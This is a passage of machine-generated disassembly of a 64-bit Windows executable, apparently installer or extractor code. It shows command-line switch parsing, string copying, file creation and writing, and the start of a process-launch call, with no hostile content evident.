   140006c57:	83 25 3e 93 00 00 fe 	andl   $0xfffffffe,0x933e(%rip)        # 0x14000ff9c
   140006c5e:	eb 18                	jmp    0x140006c78
   140006c60:	83 25 35 93 00 00 fd 	andl   $0xfffffffd,0x9335(%rip)        # 0x14000ff9c
   140006c67:	eb 0f                	jmp    0x140006c78
   140006c69:	83 0d f8 84 00 00 40 	orl    $0x40,0x84f8(%rip)        # 0x14000f168
   140006c70:	eb 0d                	jmp    0x140006c7f
   140006c72:	09 3d 24 93 00 00    	or     %edi,0x9324(%rip)        # 0x14000ff9c
   140006c78:	44 89 25 c9 81 00 00 	mov    %r12d,0x81c9(%rip)        # 0x14000ee48
   140006c7f:	8a 03                	mov    (%rbx),%al
   140006c81:	84 c0                	test   %al,%al
   140006c83:	75 8f                	jne    0x140006c14
   140006c85:	e9 66 03 00 00       	jmp    0x140006ff0
   140006c8a:	83 4c 24 28 ff       	orl    $0xffffffff,0x28(%rsp)
   140006c8f:	48 8d 44 24 41       	lea    0x41(%rsp),%rax
   140006c94:	41 83 c9 ff          	or     $0xffffffff,%r9d
   140006c98:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140006c9d:	4c 8d 05 54 4f 00 00 	lea    0x4f54(%rip),%r8        # 0x14000bbf8
   140006ca4:	41 8b d4             	mov    %r12d,%edx
   140006ca7:	b9 7f 00 00 00       	mov    $0x7f,%ecx
   140006cac:	48 ff 15 2d 46 00 00 	rex.W call *0x462d(%rip)        # 0x14000b2e0
   140006cb3:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140006cb8:	3b c7                	cmp    %edi,%eax
   140006cba:	0f 84 0e ff ff ff    	je     0x140006bce
   140006cc0:	e9 06 ff ff ff       	jmp    0x140006bcb
   140006cc5:	8a 44 24 42          	mov    0x42(%rsp),%al
   140006cc9:	84 c0                	test   %al,%al
   140006ccb:	75 0c                	jne    0x140006cd9
   140006ccd:	66 89 3d 84 81 00 00 	mov    %di,0x8184(%rip)        # 0x14000ee58
   140006cd4:	e9 f5 fe ff ff       	jmp    0x140006bce
   140006cd9:	3c 3a                	cmp    $0x3a,%al
   140006cdb:	0f 85 ea fe ff ff    	jne    0x140006bcb
   140006ce1:	48 0f be 4c 24 43    	movsbq 0x43(%rsp),%rcx
   140006ce7:	48 ff 15 da 48 00 00 	rex.W call *0x48da(%rip)        # 0x14000b5c8
   140006cee:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140006cf3:	3c 31                	cmp    $0x31,%al
   140006cf5:	74 d6                	je     0x140006ccd
   140006cf7:	3c 41                	cmp    $0x41,%al
   140006cf9:	74 09                	je     0x140006d04
   140006cfb:	3c 55                	cmp    $0x55,%al
   140006cfd:	74 ce                	je     0x140006ccd
   140006cff:	e9 c7 fe ff ff       	jmp    0x140006bcb
   140006d04:	66 44 89 25 4c 81 00 	mov    %r12w,0x814c(%rip)        # 0x14000ee58
   140006d0b:	00 
   140006d0c:	e9 bd fe ff ff       	jmp    0x140006bce
   140006d11:	8a 44 24 42          	mov    0x42(%rsp),%al
   140006d15:	84 c0                	test   %al,%al
   140006d17:	75 0c                	jne    0x140006d25
   140006d19:	44 89 25 2c 81 00 00 	mov    %r12d,0x812c(%rip)        # 0x14000ee4c
   140006d20:	e9 a9 fe ff ff       	jmp    0x140006bce
   140006d25:	3c 3a                	cmp    $0x3a,%al
   140006d27:	0f 85 9e fe ff ff    	jne    0x140006bcb
   140006d2d:	48 8b 44 24 43       	mov    0x43(%rsp),%rax
   140006d32:	84 c0                	test   %al,%al
   140006d34:	0f 84 94 fe ff ff    	je     0x140006bce
   140006d3a:	48 8d 5c 24 43       	lea    0x43(%rsp),%rbx
   140006d3f:	48 0f be c8          	movsbq %al,%rcx
   140006d43:	48 ff 15 7e 48 00 00 	rex.W call *0x487e(%rip)        # 0x14000b5c8
   140006d4a:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140006d4f:	49 03 dc             	add    %r12,%rbx
   140006d52:	3c 45                	cmp    $0x45,%al
   140006d54:	74 1f                	je     0x140006d75
   140006d56:	3c 47                	cmp    $0x47,%al
   140006d58:	74 12                	je     0x140006d6c
   140006d5a:	3c 56                	cmp    $0x56,%al
   140006d5c:	74 05                	je     0x140006d63
   140006d5e:	41 8b f7             	mov    %r15d,%esi
   140006d61:	eb 19                	jmp    0x140006d7c
   140006d63:	44 89 25 ea 80 00 00 	mov    %r12d,0x80ea(%rip)        # 0x14000ee54
   140006d6a:	eb 10                	jmp    0x140006d7c
   140006d6c:	44 89 25 dd 80 00 00 	mov    %r12d,0x80dd(%rip)        # 0x14000ee50
   140006d73:	eb 07                	jmp    0x140006d7c
   140006d75:	44 89 25 d0 80 00 00 	mov    %r12d,0x80d0(%rip)        # 0x14000ee4c
   140006d7c:	8a 03                	mov    (%rbx),%al
   140006d7e:	84 c0                	test   %al,%al
   140006d80:	75 bd                	jne    0x140006d3f
   140006d82:	e9 69 02 00 00       	jmp    0x140006ff0
   140006d87:	80 7c 24 42 3a       	cmpb   $0x3a,0x42(%rsp)
   140006d8c:	0f 85 39 fe ff ff    	jne    0x140006bcb
   140006d92:	48 8b 44 24 43       	mov    0x43(%rsp),%rax
   140006d97:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140006d9c:	2c 22                	sub    $0x22,%al
   140006d9e:	f6 d8                	neg    %al
   140006da0:	1b db                	sbb    %ebx,%ebx
   140006da2:	83 c3 04             	add    $0x4,%ebx
   140006da5:	8b c3                	mov    %ebx,%eax
   140006da7:	48 03 c8             	add    %rax,%rcx
   140006daa:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   140006dae:	48 ff c0             	inc    %rax
   140006db1:	44 38 3c 01          	cmp    %r15b,(%rcx,%rax,1)
   140006db5:	75 f7                	jne    0x140006dae
   140006db7:	48 85 c0             	test   %rax,%rax
   140006dba:	75 0c                	jne    0x140006dc8
   140006dbc:	48 8d 1d 9b 81 00 00 	lea    0x819b(%rip),%rbx        # 0x14000ef5e
   140006dc3:	e9 03 fe ff ff       	jmp    0x140006bcb
   140006dc8:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140006dcd:	89 5c 24 30          	mov    %ebx,0x30(%rsp)
   140006dd1:	e8 3a 04 00 00       	call   0x140007210
   140006dd6:	85 c0                	test   %eax,%eax
   140006dd8:	74 e2                	je     0x140006dbc
   140006dda:	48 0f be 4c 24 41    	movsbq 0x41(%rsp),%rcx
   140006de0:	48 ff 15 e1 47 00 00 	rex.W call *0x47e1(%rip)        # 0x14000b5c8
   140006de7:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140006dec:	4d 8b c5             	mov    %r13,%r8
   140006def:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140006df4:	3c 54                	cmp    $0x54,%al
   140006df6:	8b 44 24 30          	mov    0x30(%rsp),%eax
   140006dfa:	75 60                	jne    0x140006e5c
   140006dfc:	03 c3                	add    %ebx,%eax
   140006dfe:	48 8d 15 59 81 00 00 	lea    0x8159(%rip),%rdx        # 0x14000ef5e
   140006e05:	48 98                	cltq
   140006e07:	48 8d 1d 50 81 00 00 	lea    0x8150(%rip),%rbx        # 0x14000ef5e
   140006e0e:	48 2b c3             	sub    %rbx,%rax
   140006e11:	48 03 c8             	add    %rax,%rcx
   140006e14:	49 8d 80 fa fe ff 7f 	lea    0x7ffffefa(%r8),%rax
   140006e1b:	48 85 c0             	test   %rax,%rax
   140006e1e:	74 11                	je     0x140006e31
   140006e20:	8a 04 11             	mov    (%rcx,%rdx,1),%al
   140006e23:	84 c0                	test   %al,%al
   140006e25:	74 0a                	je     0x140006e31
   140006e27:	88 02                	mov    %al,(%rdx)
   140006e29:	49 03 d4             	add    %r12,%rdx
   140006e2c:	4d 2b c4             	sub    %r12,%r8
   140006e2f:	75 e3                	jne    0x140006e14
   140006e31:	4d 85 c0             	test   %r8,%r8
   140006e34:	48 8d 42 ff          	lea    -0x1(%rdx),%rax
   140006e38:	4c 8d 05 f1 49 00 00 	lea    0x49f1(%rip),%r8        # 0x14000b830
   140006e3f:	48 8b cb             	mov    %rbx,%rcx
   140006e42:	48 0f 45 c2          	cmovne %rdx,%rax
   140006e46:	41 8b d5             	mov    %r13d,%edx
   140006e49:	44 88 38             	mov    %r15b,(%rax)
   140006e4c:	e8 8b 27 00 00       	call   0x1400095dc
   140006e51:	8a 15 07 81 00 00    	mov    0x8107(%rip),%dl        # 0x14000ef5e
   140006e57:	48 8b cb             	mov    %rbx,%rcx
   140006e5a:	eb 65                	jmp    0x140006ec1
   140006e5c:	03 c3                	add    %ebx,%eax
   140006e5e:	4c 8d 0d f5 7f 00 00 	lea    0x7ff5(%rip),%r9        # 0x14000ee5a
   140006e65:	48 98                	cltq
   140006e67:	49 8b d1             	mov    %r9,%rdx
   140006e6a:	49 2b c1             	sub    %r9,%rax
   140006e6d:	48 03 c8             	add    %rax,%rcx
   140006e70:	49 8d 80 fa fe ff 7f 	lea    0x7ffffefa(%r8),%rax
   140006e77:	48 85 c0             	test   %rax,%rax
   140006e7a:	74 11                	je     0x140006e8d
   140006e7c:	8a 04 11             	mov    (%rcx,%rdx,1),%al
   140006e7f:	84 c0                	test   %al,%al
   140006e81:	74 0a                	je     0x140006e8d
   140006e83:	88 02                	mov    %al,(%rdx)
   140006e85:	49 03 d4             	add    %r12,%rdx
   140006e88:	4d 2b c4             	sub    %r12,%r8
   140006e8b:	75 e3                	jne    0x140006e70
   140006e8d:	4d 85 c0             	test   %r8,%r8
   140006e90:	48 8d 42 ff          	lea    -0x1(%rdx),%rax
   140006e94:	4c 8d 05 95 49 00 00 	lea    0x4995(%rip),%r8        # 0x14000b830
   140006e9b:	49 8b c9             	mov    %r9,%rcx
   140006e9e:	48 0f 45 c2          	cmovne %rdx,%rax
   140006ea2:	41 8b d5             	mov    %r13d,%edx
   140006ea5:	44 88 38             	mov    %r15b,(%rax)
   140006ea8:	e8 2f 27 00 00       	call   0x1400095dc
   140006ead:	8a 15 a7 7f 00 00    	mov    0x7fa7(%rip),%dl        # 0x14000ee5a
   140006eb3:	48 8d 0d a0 7f 00 00 	lea    0x7fa0(%rip),%rcx        # 0x14000ee5a
   140006eba:	48 8d 1d 9d 80 00 00 	lea    0x809d(%rip),%rbx        # 0x14000ef5e
   140006ec1:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   140006ec5:	48 ff c0             	inc    %rax
   140006ec8:	44 38 3c 01          	cmp    %r15b,(%rcx,%rax,1)
   140006ecc:	75 f7                	jne    0x140006ec5
   140006ece:	48 83 f8 03          	cmp    $0x3,%rax
   140006ed2:	72 18                	jb     0x140006eec
   140006ed4:	8a 41 01             	mov    0x1(%rcx),%al
   140006ed7:	3c 3a                	cmp    $0x3a,%al
   140006ed9:	0f 84 ef fc ff ff    	je     0x140006bce
   140006edf:	80 fa 5c             	cmp    $0x5c,%dl
   140006ee2:	75 08                	jne    0x140006eec
   140006ee4:	3a c2                	cmp    %dl,%al
   140006ee6:	0f 84 e2 fc ff ff    	je     0x140006bce
   140006eec:	33 c0                	xor    %eax,%eax
   140006eee:	e9 3f 01 00 00       	jmp    0x140007032
   140006ef3:	8a 44 24 42          	mov    0x42(%rsp),%al
   140006ef7:	84 c0                	test   %al,%al
   140006ef9:	75 0c                	jne    0x140006f07
   140006efb:	44 89 25 42 7f 00 00 	mov    %r12d,0x7f42(%rip)        # 0x14000ee44
   140006f02:	e9 c7 fc ff ff       	jmp    0x140006bce
   140006f07:	3c 3a                	cmp    $0x3a,%al
   140006f09:	0f 85 bc fc ff ff    	jne    0x140006bcb
   140006f0f:	48 8b 44 24 43       	mov    0x43(%rsp),%rax
   140006f14:	48 8d 5c 24 40       	lea    0x40(%rsp),%rbx
   140006f19:	2c 22                	sub    $0x22,%al
   140006f1b:	f6 d8                	neg    %al
   140006f1d:	1b ff                	sbb    %edi,%edi
   140006f1f:	83 c7 04             	add    $0x4,%edi
   140006f22:	8b c7                	mov    %edi,%eax
   140006f24:	48 03 d8             	add    %rax,%rbx
   140006f27:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   140006f2b:	48 ff c0             	inc    %rax
   140006f2e:	44 38 3c 03          	cmp    %r15b,(%rbx,%rax,1)
   140006f32:	75 f7                	jne    0x140006f2b
   140006f34:	48 85 c0             	test   %rax,%rax
   140006f37:	75 0a                	jne    0x140006f43
   140006f39:	bf 02 00 00 00       	mov    $0x2,%edi
   140006f3e:	e9 79 fe ff ff       	jmp    0x140006dbc
   140006f43:	ba 5b 00 00 00       	mov    $0x5b,%edx
   140006f48:	48 8b cb             	mov    %rbx,%rcx
   140006f4b:	e8 cc 27 00 00       	call   0x14000971c
   140006f50:	48 85 c0             	test   %rax,%rax
   140006f53:	74 12                	je     0x140006f67
   140006f55:	ba 5d 00 00 00       	mov    $0x5d,%edx
   140006f5a:	48 8b cb             	mov    %rbx,%rcx
   140006f5d:	e8 ba 27 00 00       	call   0x14000971c
   140006f62:	48 85 c0             	test   %rax,%rax
   140006f65:	74 d2                	je     0x140006f39
   140006f67:	ba 5d 00 00 00       	mov    $0x5d,%edx
   140006f6c:	48 8b cb             	mov    %rbx,%rcx
   140006f6f:	e8 a8 27 00 00       	call   0x14000971c
   140006f74:	48 85 c0             	test   %rax,%rax
   140006f77:	74 12                	je     0x140006f8b
   140006f79:	ba 5b 00 00 00       	mov    $0x5b,%edx
   140006f7e:	48 8b cb             	mov    %rbx,%rcx
   140006f81:	e8 96 27 00 00       	call   0x14000971c
   140006f86:	48 85 c0             	test   %rax,%rax
   140006f89:	74 ae                	je     0x140006f39
   140006f8b:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140006f90:	89 7c 24 30          	mov    %edi,0x30(%rsp)
   140006f94:	48 8b cb             	mov    %rbx,%rcx
   140006f97:	e8 74 02 00 00       	call   0x140007210
   140006f9c:	85 c0                	test   %eax,%eax
   140006f9e:	74 99                	je     0x140006f39
   140006fa0:	8b 44 24 30          	mov    0x30(%rsp),%eax
   140006fa4:	4c 8d 0d b7 80 00 00 	lea    0x80b7(%rip),%r9        # 0x14000f062
   140006fab:	03 c7                	add    %edi,%eax
   140006fad:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140006fb2:	48 98                	cltq
   140006fb4:	4d 8b c5             	mov    %r13,%r8
   140006fb7:	49 2b c1             	sub    %r9,%rax
   140006fba:	49 8b d1             	mov    %r9,%rdx
   140006fbd:	48 03 c8             	add    %rax,%rcx
   140006fc0:	49 8d 80 fa fe ff 7f 	lea    0x7ffffefa(%r8),%rax
   140006fc7:	48 85 c0             	test   %rax,%rax
   140006fca:	74 11                	je     0x140006fdd
   140006fcc:	8a 04 11             	mov    (%rcx,%rdx,1),%al
   140006fcf:	84 c0                	test   %al,%al
   140006fd1:	74 0a                	je     0x140006fdd
   140006fd3:	88 02                	mov    %al,(%rdx)
   140006fd5:	49 03 d4             	add    %r12,%rdx
   140006fd8:	4d 2b c4             	sub    %r12,%r8
   140006fdb:	75 e3                	jne    0x140006fc0
   140006fdd:	4d 85 c0             	test   %r8,%r8
   140006fe0:	48 8d 42 ff          	lea    -0x1(%rdx),%rax
   140006fe4:	bf 02 00 00 00       	mov    $0x2,%edi
   140006fe9:	48 0f 45 c2          	cmovne %rdx,%rax
   140006fed:	44 88 38             	mov    %r15b,(%rax)
   140006ff0:	48 8d 1d 67 7f 00 00 	lea    0x7f67(%rip),%rbx        # 0x14000ef5e
   140006ff7:	e9 d2 fb ff ff       	jmp    0x140006bce
   140006ffc:	e8 a7 bb ff ff       	call   0x140002ba8
   140007001:	48 8b 0d 08 79 00 00 	mov    0x7908(%rip),%rcx        # 0x14000e910
   140007008:	48 85 c9             	test   %rcx,%rcx
   14000700b:	74 0c                	je     0x140007019
   14000700d:	48 ff 15 0c 43 00 00 	rex.W call *0x430c(%rip)        # 0x14000b320
   140007014:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007019:	33 c9                	xor    %ecx,%ecx
   14000701b:	48 ff 15 4e 44 00 00 	rex.W call *0x444e(%rip)        # 0x14000b470
   140007022:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007027:	cc                   	int3
   140007028:	41 8b f7             	mov    %r15d,%esi
   14000702b:	8b c6                	mov    %esi,%eax
   14000702d:	eb 03                	jmp    0x140007032
   14000702f:	41 8b c4             	mov    %r12d,%eax
   140007032:	48 8b 4d 50          	mov    0x50(%rbp),%rcx
   140007036:	48 33 cc             	xor    %rsp,%rcx
   140007039:	e8 72 2b 00 00       	call   0x140009bb0
   14000703e:	4c 8d 9c 24 60 01 00 	lea    0x160(%rsp),%r11
   140007045:	00 
   140007046:	49 8b 5b 38          	mov    0x38(%r11),%rbx
   14000704a:	49 8b 73 40          	mov    0x40(%r11),%rsi
   14000704e:	49 8b 7b 48          	mov    0x48(%r11),%rdi
   140007052:	49 8b e3             	mov    %r11,%rsp
   140007055:	41 5f                	pop    %r15
   140007057:	41 5e                	pop    %r14
   140007059:	41 5d                	pop    %r13
   14000705b:	41 5c                	pop    %r12
   14000705d:	5d                   	pop    %rbp
   14000705e:	c3                   	ret
   14000705f:	cc                   	int3
   140007060:	e8 ff a6 ff ff       	call   0x140001764
   140007065:	cc                   	int3
   140007066:	cc                   	int3
   140007067:	cc                   	int3
   140007068:	cc                   	int3
   140007069:	cc                   	int3
   14000706a:	cc                   	int3
   14000706b:	cc                   	int3
   14000706c:	cc                   	int3
   14000706d:	cc                   	int3
   14000706e:	cc                   	int3
   14000706f:	cc                   	int3
   140007070:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007075:	44 8b d9             	mov    %ecx,%r11d
   140007078:	4c 8d 15 81 7d 00 00 	lea    0x7d81(%rip),%r10        # 0x14000ee00
   14000707f:	41 b9 00 02 00 00    	mov    $0x200,%r9d
   140007085:	bb 08 00 00 00       	mov    $0x8,%ebx
   14000708a:	33 d2                	xor    %edx,%edx
   14000708c:	41 8b c3             	mov    %r11d,%eax
   14000708f:	41 f7 f1             	div    %r9d
   140007092:	44 8b c2             	mov    %edx,%r8d
   140007095:	41 f7 d8             	neg    %r8d
   140007098:	1b c9                	sbb    %ecx,%ecx
   14000709a:	41 23 c9             	and    %r9d,%ecx
   14000709d:	45 03 c9             	add    %r9d,%r9d
   1400070a0:	2b ca                	sub    %edx,%ecx
   1400070a2:	41 03 cb             	add    %r11d,%ecx
   1400070a5:	41 01 0a             	add    %ecx,(%r10)
   1400070a8:	4d 8d 52 04          	lea    0x4(%r10),%r10
   1400070ac:	48 83 eb 01          	sub    $0x1,%rbx
   1400070b0:	75 d8                	jne    0x14000708a
   1400070b2:	8d 43 01             	lea    0x1(%rbx),%eax
   1400070b5:	48 8b 5c 24 08       	mov    0x8(%rsp),%rbx
   1400070ba:	c3                   	ret
   1400070bb:	cc                   	int3
   1400070bc:	cc                   	int3
   1400070bd:	cc                   	int3
   1400070be:	cc                   	int3
   1400070bf:	cc                   	int3
   1400070c0:	cc                   	int3
   1400070c1:	cc                   	int3
   1400070c2:	cc                   	int3
   1400070c3:	cc                   	int3
   1400070c4:	cc                   	int3
   1400070c5:	cc                   	int3
   1400070c6:	cc                   	int3
   1400070c7:	cc                   	int3
   1400070c8:	cc                   	int3
   1400070c9:	cc                   	int3
   1400070ca:	cc                   	int3
   1400070cb:	cc                   	int3
   1400070cc:	cc                   	int3
   1400070cd:	cc                   	int3
   1400070ce:	cc                   	int3
   1400070cf:	cc                   	int3
   1400070d0:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   1400070d5:	55                   	push   %rbp
   1400070d6:	56                   	push   %rsi
   1400070d7:	57                   	push   %rdi
   1400070d8:	48 81 ec 70 01 00 00 	sub    $0x170,%rsp
   1400070df:	48 8b 05 9a 6f 00 00 	mov    0x6f9a(%rip),%rax        # 0x14000e080
   1400070e6:	48 33 c4             	xor    %rsp,%rax
   1400070e9:	48 89 84 24 60 01 00 	mov    %rax,0x160(%rsp)
   1400070f0:	00 
   1400070f1:	83 64 24 40 00       	andl   $0x0,0x40(%rsp)
   1400070f6:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   1400070fb:	8b f1                	mov    %ecx,%esi
   1400070fd:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   140007102:	48 8d 0d 47 86 00 00 	lea    0x8647(%rip),%rcx        # 0x14000f750
   140007109:	41 ba 04 01 00 00    	mov    $0x104,%r10d
   14000710f:	49 8b e9             	mov    %r9,%rbp
   140007112:	48 2b c8             	sub    %rax,%rcx
   140007115:	bb 01 00 00 00       	mov    $0x1,%ebx
   14000711a:	45 8b ca             	mov    %r10d,%r9d
   14000711d:	49 8d 81 fa fe ff 7f 	lea    0x7ffffefa(%r9),%rax
   140007124:	48 85 c0             	test   %rax,%rax
   140007127:	74 11                	je     0x14000713a
   140007129:	8a 04 11             	mov    (%rcx,%rdx,1),%al
   14000712c:	84 c0                	test   %al,%al
   14000712e:	74 0a                	je     0x14000713a
   140007130:	88 02                	mov    %al,(%rdx)
   140007132:	48 03 d3             	add    %rbx,%rdx
   140007135:	4c 2b cb             	sub    %rbx,%r9
   140007138:	75 e3                	jne    0x14000711d
   14000713a:	48 8d 42 ff          	lea    -0x1(%rdx),%rax
   14000713e:	4d 85 c9             	test   %r9,%r9
   140007141:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140007146:	48 0f 45 c2          	cmovne %rdx,%rax
   14000714a:	41 8b d2             	mov    %r10d,%edx
   14000714d:	c6 00 00             	movb   $0x0,(%rax)
   140007150:	e8 87 24 00 00       	call   0x1400095dc
   140007155:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   14000715b:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140007160:	c7 44 24 28 80 00 00 	movl   $0x80,0x28(%rsp)
   140007167:	00 
   140007168:	45 33 c9             	xor    %r9d,%r9d
   14000716b:	45 33 c0             	xor    %r8d,%r8d
   14000716e:	c7 44 24 20 02 00 00 	movl   $0x2,0x20(%rsp)
   140007175:	00 
   140007176:	ba 00 00 00 40       	mov    $0x40000000,%edx
   14000717b:	48 ff 15 a6 42 00 00 	rex.W call *0x42a6(%rip)        # 0x14000b428
   140007182:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007187:	48 8b f8             	mov    %rax,%rdi
   14000718a:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000718e:	75 0e                	jne    0x14000719e
   140007190:	c7 05 ea 84 00 00 52 	movl   $0x80070052,0x84ea(%rip)        # 0x14000f684
   140007197:	00 07 80 
   14000719a:	33 db                	xor    %ebx,%ebx
   14000719c:	eb 45                	jmp    0x1400071e3
   14000719e:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   1400071a4:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   1400071a9:	44 8b c6             	mov    %esi,%r8d
   1400071ac:	48 8b d5             	mov    %rbp,%rdx
   1400071af:	48 8b cf             	mov    %rdi,%rcx
   1400071b2:	48 ff 15 ef 41 00 00 	rex.W call *0x41ef(%rip)        # 0x14000b3a8
   1400071b9:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400071be:	85 c0                	test   %eax,%eax
   1400071c0:	74 06                	je     0x1400071c8
   1400071c2:	3b 74 24 40          	cmp    0x40(%rsp),%esi
   1400071c6:	74 0c                	je     0x1400071d4
   1400071c8:	c7 05 b2 84 00 00 52 	movl   $0x80070052,0x84b2(%rip)        # 0x14000f684
   1400071cf:	00 07 80 
   1400071d2:	33 db                	xor    %ebx,%ebx
   1400071d4:	48 8b cf             	mov    %rdi,%rcx
   1400071d7:	48 ff 15 42 41 00 00 	rex.W call *0x4142(%rip)        # 0x14000b320
   1400071de:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400071e3:	8b c3                	mov    %ebx,%eax
   1400071e5:	48 8b 8c 24 60 01 00 	mov    0x160(%rsp),%rcx
   1400071ec:	00 
   1400071ed:	48 33 cc             	xor    %rsp,%rcx
   1400071f0:	e8 bb 29 00 00       	call   0x140009bb0
   1400071f5:	48 8b 9c 24 98 01 00 	mov    0x198(%rsp),%rbx
   1400071fc:	00 
   1400071fd:	48 81 c4 70 01 00 00 	add    $0x170,%rsp
   140007204:	5f                   	pop    %rdi
   140007205:	5e                   	pop    %rsi
   140007206:	5d                   	pop    %rbp
   140007207:	c3                   	ret
   140007208:	cc                   	int3
   140007209:	cc                   	int3
   14000720a:	cc                   	int3
   14000720b:	cc                   	int3
   14000720c:	cc                   	int3
   14000720d:	cc                   	int3
   14000720e:	cc                   	int3
   14000720f:	cc                   	int3
   140007210:	8a 01                	mov    (%rcx),%al
   140007212:	45 33 c0             	xor    %r8d,%r8d
   140007215:	4c 8b da             	mov    %rdx,%r11
   140007218:	4c 8b c9             	mov    %rcx,%r9
   14000721b:	84 c0                	test   %al,%al
   14000721d:	74 19                	je     0x140007238
   14000721f:	48 8b d1             	mov    %rcx,%rdx
   140007222:	3c 20                	cmp    $0x20,%al
   140007224:	74 06                	je     0x14000722c
   140007226:	2c 09                	sub    $0x9,%al
   140007228:	3c 04                	cmp    $0x4,%al
   14000722a:	77 0c                	ja     0x140007238
   14000722c:	48 ff c2             	inc    %rdx
   14000722f:	41 ff c0             	inc    %r8d
   140007232:	8a 02                	mov    (%rdx),%al
   140007234:	84 c0                	test   %al,%al
   140007236:	75 ea                	jne    0x140007222
   140007238:	4d 63 d0             	movslq %r8d,%r10
   14000723b:	4d 03 d1             	add    %r9,%r10
   14000723e:	41 80 3a 00          	cmpb   $0x0,(%r10)
   140007242:	75 04                	jne    0x140007248
   140007244:	33 c0                	xor    %eax,%eax
   140007246:	c3                   	ret
   140007247:	cc                   	int3
   140007248:	48 83 c9 ff          	or     $0xffffffffffffffff,%rcx
   14000724c:	48 ff c1             	inc    %rcx
   14000724f:	41 80 3c 0a 00       	cmpb   $0x0,(%r10,%rcx,1)
   140007254:	75 f6                	jne    0x14000724c
   140007256:	83 e9 01             	sub    $0x1,%ecx
   140007259:	48 63 d1             	movslq %ecx,%rdx
   14000725c:	78 16                	js     0x140007274
   14000725e:	41 8a 04 12          	mov    (%r10,%rdx,1),%al
   140007262:	3c 20                	cmp    $0x20,%al
   140007264:	74 06                	je     0x14000726c
   140007266:	2c 09                	sub    $0x9,%al
   140007268:	3c 04                	cmp    $0x4,%al
   14000726a:	77 08                	ja     0x140007274
   14000726c:	ff c9                	dec    %ecx
   14000726e:	48 83 ea 01          	sub    $0x1,%rdx
   140007272:	79 ea                	jns    0x14000725e
   140007274:	41 03 c8             	add    %r8d,%ecx
   140007277:	45 89 03             	mov    %r8d,(%r11)
   14000727a:	48 63 d1             	movslq %ecx,%rdx
   14000727d:	b8 01 00 00 00       	mov    $0x1,%eax
   140007282:	42 c6 44 0a 01 00    	movb   $0x0,0x1(%rdx,%r9,1)
   140007288:	c3                   	ret
   140007289:	cc                   	int3
   14000728a:	cc                   	int3
   14000728b:	cc                   	int3
   14000728c:	cc                   	int3
   14000728d:	cc                   	int3
   14000728e:	cc                   	int3
   14000728f:	cc                   	int3
   140007290:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140007295:	55                   	push   %rbp
   140007296:	56                   	push   %rsi
   140007297:	57                   	push   %rdi
   140007298:	48 8d ac 24 80 fe ff 	lea    -0x180(%rsp),%rbp
   14000729f:	ff 
   1400072a0:	48 81 ec 80 02 00 00 	sub    $0x280,%rsp
   1400072a7:	48 8b 05 d2 6d 00 00 	mov    0x6dd2(%rip),%rax        # 0x14000e080
   1400072ae:	48 33 c4             	xor    %rsp,%rax
   1400072b1:	48 89 85 70 01 00 00 	mov    %rax,0x170(%rbp)
   1400072b8:	83 64 24 50 00       	andl   $0x0,0x50(%rsp)
   1400072bd:	48 8b d9             	mov    %rcx,%rbx
   1400072c0:	be 01 00 00 00       	mov    $0x1,%esi
   1400072c5:	48 85 c9             	test   %rcx,%rcx
   1400072c8:	75 07                	jne    0x1400072d1
   1400072ca:	33 c0                	xor    %eax,%eax
   1400072cc:	e9 b2 01 00 00       	jmp    0x140007483
   1400072d1:	33 c0                	xor    %eax,%eax
   1400072d3:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400072d6:	48 89 44 24 68       	mov    %rax,0x68(%rsp)
   1400072db:	45 33 c9             	xor    %r9d,%r9d
   1400072de:	48 8d 44 24 58       	lea    0x58(%rsp),%rax
   1400072e3:	45 33 c0             	xor    %r8d,%r8d
   1400072e6:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   1400072eb:	33 c9                	xor    %ecx,%ecx
   1400072ed:	48 89 54 24 40       	mov    %rdx,0x40(%rsp)
   1400072f2:	48 8b d3             	mov    %rbx,%rdx
   1400072f5:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   1400072fb:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   140007301:	c7 44 24 28 20 00 00 	movl   $0x20,0x28(%rsp)
   140007308:	00 
   140007309:	83 64 24 20 00       	andl   $0x0,0x20(%rsp)
   14000730e:	0f 11 44 24 58       	movups %xmm0,0x58(%rsp)
   140007313:	48 ff 15 66 41 00 00 	rex.W call *0x4166(%rip)        # 0x14000b480
   14000731a:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000731f:	85 c0                	test   %eax,%eax
   140007321:	0f 84 ef 00 00 00    	je     0x140007416
   140007327:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   14000732c:	83 ca ff             	or     $0xffffffff,%edx
   14000732f:	48 ff 15 ba 40 00 00 	rex.W call *0x40ba(%rip)        # 0x14000b3f0
   140007336:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
